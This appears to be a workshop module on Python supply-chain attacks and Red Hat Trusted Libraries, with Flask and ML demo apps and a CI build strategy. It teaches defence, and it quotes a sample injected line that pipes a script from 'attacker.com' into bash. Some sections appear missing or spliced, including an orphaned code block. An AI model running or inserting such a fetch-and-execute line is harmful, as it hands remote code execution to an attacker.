[[introduction]]
== Introduction

Every SBOM tells you *what* packages are in your container. But **how do you know those packages are what they claim to be?** When you run `pip install flask`, you are trusting:

* PyPI's infrastructure hasn't been compromised
* The package maintainer's credentials haven't been stolen
* No one has performed a typosquatting attack (`reqeusts` instead of `requests`)
* The package hasn't been tampered with in transit

This is not theoretical. In 2022, the `ctx` package (8 million downloads) was compromised and pushed malicious code to PyPI. In 2023, dozens of typosquatting packages targeted AI/ML developers with names like `torchvision-nightly`, `tensorflow-cpu`, and `transformerz`.

=== The Red Hat Trusted Libraries Solution

**Red Hat Trusted Libraries** extends the zero-CVE posture from Module 2.7 to your application dependencies. Instead of trusting PyPI, you pull from a Red Hat-operated index where every package is:

* **Rebuilt** from source in a hermetic Konflux pipeline (SLSA Level 3)
* **Scanned** for vulnerabilities by Red Hat security teams
* **Signed** with Sigstore keyless signing (verifiable in Rekor transparency log)
* **Attested** with cryptographic SLSA provenance metadata

When you combine Hummingbird distroless runtimes (zero OS packages) with Trusted Libraries (verified dependencies), you achieve a **complete zero-CVE stack** with provenance from source to deployment.

[[supply-chain-risks]]
== Exercise 1: The PyPI Supply Chain Problem

=== Understanding Dependency Attacks

Python dependency attacks fall into several categories:

*1. Compromised Packages (Account Takeover)*

In May 2022, the `ctx` package (8M downloads) was compromised when attackers gained access to the maintainer's PyPI account:

[source,python]
----
# Malicious code injected into ctx v0.1.2
import os
os.system('curl https://attacker.com/collect | bash')
----

The package remained compromised for hours before PyPI removed it. Any automation that ran `pip install ctx` during that window executed arbitrary code.

*2. Typosquatting*

Attackers register packages with names similar to popular libraries:

[source,bash]
----
pip install reqeusts    # Note the typo - installs malicious package
pip install requests    # Legitimate package
----

In 2023, security researchers found over 400 typosquatting packages targeting data science libraries (`numpy`, `pandas`, `scikit-learn`).

*3. Dependency Confusion*

If your `requirements.txt` includes an internal package name that also exists on PyPI, pip might install the public version:

[source,txt]
----
# requirements.txt
internal-auth-lib==1.0.0  # Your private package

# Attacker registers "internal-auth-lib" on PyPI with version 999.0.0
# pip install chooses the higher version from PyPI
----

*4. Unmaintained Dependencies with Known CVEs*

Even legitimate packages can have vulnerabilities. If maintainers abandon a project, CVEs never get fixed. PyPI has no mechanism to force security updates.

=== Why SBOM Alone Isn't Sufficient

An SBOM tells you `flask==3.0.0` is in your image. But it doesn't prove:

* The package came from the legitimate maintainer
* The package wasn't tampered with in transit
* The package was built from the expected source code
* The package was scanned for vulnerabilities

**Red Hat Trusted Libraries solves this by providing cryptographic provenance** -- every package has a verifiable chain of custody from source repository to your container.

[TIP]
====
Read more about supply chain attacks:

* CVE Database: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=pypi
* NIST Software Supply Chain Guidance: https://csrc.nist.gov/Projects/ssdf
* Red Hat Trusted Libraries Architecture: https://www.redhat.com/en/blog/extend-trust-across-software-supply-chain-red-hat-trusted-libraries
====

"""
Simple Flask REST API for Trusted Libraries demonstration.
"""
from flask import Flask, jsonify, request
import requests
import sys
import platform
from datetime import datetime
from cryptography.fernet import Fernet

app = Flask(__name__)

# Generate encryption key for demonstration
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint."""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat() + 'Z'
    })

@app.route('/api/info', methods=['GET'])
def get_info():
    """Show runtime and dependency information."""
    return jsonify({
        'message': 'Hummingbird microservice',
        'python_version': sys.version,
        'platform': platform.platform(),
        'dependencies': {
            'flask': get_package_version('flask'),
            'requests': get_package_version('requests'),
            'cryptography': get_package_version('cryptography'),
            'gunicorn': get_package_version('gunicorn')
        },
        'timestamp': datetime.utcnow().isoformat() + 'Z'
    })

@app.route('/api/encrypt', methods=['POST'])
def encrypt_data():
    """Demonstrates cryptography library usage."""
    data = request.get_json()
    if not data or 'text' not in data:
        return jsonify({'error': 'Missing "text" field'}), 400

    plaintext = data['text'].encode('utf-8')
    encrypted = cipher.encrypt(plaintext)

    return jsonify({
        'encrypted': encrypted.decode('utf-8'),
        'algorithm': 'Fernet (AES-128-CBC)'
    })

def get_package_version(package_name):
    """Get installed package version."""
    try:
        import importlib.metadata
        return importlib.metadata.version(package_name)
    except Exception:
        return 'unknown'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
EOF
----

== Exercise 4: CPU-Only ML Inference Container

=== Why ML Dependencies Need Verification

AI/ML applications have unique supply chain risks:

* **Large attack surface**: ML stacks pull hundreds of dependencies (`numpy`, `pandas`, `scipy`, `transformers`, `torch`)
* **High-value targets**: Attackers know AI/ML containers often have access to sensitive training data
* **Typosquatting prevalence**: Popular ML packages are frequently targeted (`tensorflow-gpu`, `torch-nightly`, `transformerz`)

Red Hat Trusted Libraries includes verified builds of common ML packages, enabling **secure AI/ML deployments**.

=== Step 1: Create ML Inference Application

Create a sentiment analysis API using Hugging Face Transformers:

[source,bash,role=execute]
----
cd ~/hummingbird-lab/trusted-libraries-demo

cat > inference.py << 'EOF'
"""
CPU-only sentiment analysis API using Hugging Face Transformers.
Demonstrates ML inference with verified dependencies from Red Hat Trusted Libraries.
"""
from flask import Flask, request, jsonify
from transformers import pipeline
import sys

app = Flask(__name__)

# Load sentiment analysis model (CPU-only, no GPU required)
# Model: distilbert-base-uncased-finetuned-sst-2-english (~250MB)
print("Loading sentiment analysis model...", file=sys.stderr)
sentiment_analyzer = pipeline(
    "sentiment-analysis",
    model="distilbert-base-uncased-finetuned-sst-2-english",
    device=-1  # CPU only
)
print("Model loaded successfully", file=sys.stderr)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'model': 'distilbert-sst2'})

@app.route('/predict', methods=['POST'])
def predict():
    """Analyze sentiment of provided text."""
    data = request.get_json()
    if not data or 'text' not in data:
        return jsonify({'error': 'Missing "text" field'}), 400

    text = data['text']
    result = sentiment_analyzer(text)[0]

    return jsonify({
        'text': text,
        'sentiment': result['label'],
        'confidence': result['score'],
        'model': 'distilbert-base-uncased-finetuned-sst-2-english'
    })

@app.route('/batch', methods=['POST'])
def batch_predict():
    """Analyze sentiment of multiple texts."""
    data = request.get_json()
    if not data or 'texts' not in data:
        return jsonify({'error': 'Missing "texts" array'}), 400

    texts = data['texts']
    results = sentiment_analyzer(texts)

    return jsonify({
        'results': [
            {'text': t, 'sentiment': r['label'], 'confidence': r['score']}
            for t, r in zip(texts, results)
        ]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
EOF
----

== Exercise 5: DevSecOps Integration with Shipwright (Optional)

This optional exercise shows how to automate Trusted Libraries verification in your CI/CD pipelines using Shipwright BuildStrategies.

=== Step 1: Create Trusted Libraries BuildStrategy

[source,bash,role=execute]
----
cat << 'EOF' | oc apply -f -
apiVersion: shipwright.io/v1beta1
kind: ClusterBuildStrategy
metadata:
  name: python-trusted-libraries
spec:
  parameters:
  - name: TRUSTED_LIBS_USERNAME
    description: Registry Service Account username
  - name: TRUSTED_LIBS_TOKEN
    description: Registry Service Account token
  volumes:
  - name: workspace
    emptyDir: {}
  steps:
  - name: configure-pip
    image: registry.access.redhat.com/ubi9/python-311:latest
    workingDir: /workspace
    volumeMounts:
    - name: workspace
      mountPath: /workspace
    script: |
      #!/bin/bash
      set -e

      # Create pip config with Trusted Libraries index
      mkdir -p ~/.config/pip
      cat > ~/.config/pip/pip.conf << EOT
      [global]
      index-url = https://$(params.TRUSTED_LIBS_USERNAME):$(params.TRUSTED_LIBS_TOKEN)@packages.redhat.com/trusted-libraries/python/simple
      trusted-host = packages.redhat.com
      EOT

      echo "Configured pip for Red Hat Trusted Libraries"

  - name: build-and-push
    image: quay.io/buildah/stable:latest
    workingDir: /workspace/source
    securityContext:
      capabilities:
        add: ["SETFCAP"]
    script: |
      #!/bin/bash
      set -e

      # Build image with Trusted Libraries
      buildah bud \
        --format=oci \
        --tls-verify=true \
        --no-cache \
        -f Containerfile.trusted \
        -t $(params.output-image) \
        .

      # Push to registry
      buildah push \
        --tls-verify=true \
        $(params.output-image)

  - name: verify-sbom
    image: anchore/syft:latest
    script: |
      #!/bin/bash
      set -e

      # Generate SBOM
      syft $(params.output-image) -o json > /tmp/sbom.json

      # Verify packages came from Trusted Libraries
      # (In production, implement cryptographic verification here)
      echo "SBOM generated and basic verification complete"

      # Optional: Upload SBOM to Trusted Profile Analyzer
      # See: https://developers.redhat.com/articles/2024/03/18/red-hat-trusted-profile-analyzer-now-tech-preview
EOF
